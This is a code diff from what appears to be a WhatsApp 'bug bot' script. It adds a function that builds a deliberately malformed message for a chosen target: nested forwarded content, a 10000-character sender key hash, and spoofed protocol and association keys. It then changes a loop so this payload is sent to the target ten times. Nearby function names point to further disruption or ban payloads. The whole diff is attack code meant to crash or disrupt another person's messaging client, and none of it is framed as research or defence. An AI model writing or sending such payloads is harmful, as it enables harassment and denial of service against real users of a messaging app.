@@ -1858,6 +1858,80 @@ async function delayhard(sock, target) {
     });
 }
 
+async function tryfuncditz(sock, target) {
+  const msg = {
+    contactMessage: {
+      displayName: "Nullmessage",
+      vcard:
+        "BEGIN:VCARD\n" +
+        "VERSION:3.0\n" +
+        "FN:Nullmessage\n" +
+        "N:Nullmessage;;;;\n" +
+        "TEL;type=CELL;type=VOICE;waid=6281234567890:+6281234567890\n" +
+        "END:VCARD",
+      contextInfo: {
+        forwardingScore: 9999,
+        isForwarded: true,
+        quotedMessage: {
+          locationMessage: {
+            degreesLatitude: -6.2088,
+            degreesLongitude: 106.8456,
+            name: "Nullmessage",
+            address: "Jakarta",
+            url: "https://maps.google.com/?q=-6.2088,106.8456",
+            jpegThumbnail: Buffer.alloc(100, 0xaa),
+            contextInfo: {
+              forwardingScore: 9999,
+              isForwarded: true,
+            },
+          },
+        },
+      },
+    },
+    messageContextInfo: {
+      deviceListMetadata: {
+        senderKeyHash: Buffer.from("0".repeat(10000), "hex"),
+        senderTimestamp: Date.now(),
+        senderAccountType: 0,
+      },
+      deviceListMetadataVersion: 2,
+      messageSecret: Buffer.alloc(32, 7),
+      messageAddOnDurationInSecs: 86400,
+      reportingTokenVersion: 2,
+      supportPayload: JSON.stringify({ x: "Nullmessage" }),
+    },
+    protocolMessage: {
+      type: 0,
+      key: {
+        remoteJid: target,
+        fromMe: true,
+        id: "3EB0" + Math.random().toString(16).slice(2, 18).toUpperCase(),
+      },
+      timestampMs: Date.now(),
+      limitSharing: {
+        sharingLimited: true,
+        trigger: 1,
+        limitSharingSettingTimestamp: Date.now(),
+        initiatedByMe: true,
+      },
+      afterReadDuration: 86400,
+    },
+    messageAssociation: {
+      associationType: 8,
+      parentMessageKey: {
+        remoteJid: target,
+        fromMe: true,
+        id: "3EB0" + Math.random().toString(16).slice(2, 18).toUpperCase(),
+      },
+      messageIndex: 0,
+    },
+  };
+
+  await sock.relayMessage(target, msg, {
+    participant: { jid: target },
+  });
+}
+
 async function halonyetGB(sock, target) {
     const msg = {
         groupStatusMessageV2: {
@@ -2047,7 +2121,7 @@ async function bansgc(sock, targetgroup) {
 async function bug1(sock, target) {
   for (let i = 0; i < 10; i++) {
     try {
-      await halonyet(sock, target);
+      await tryfuncditz(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
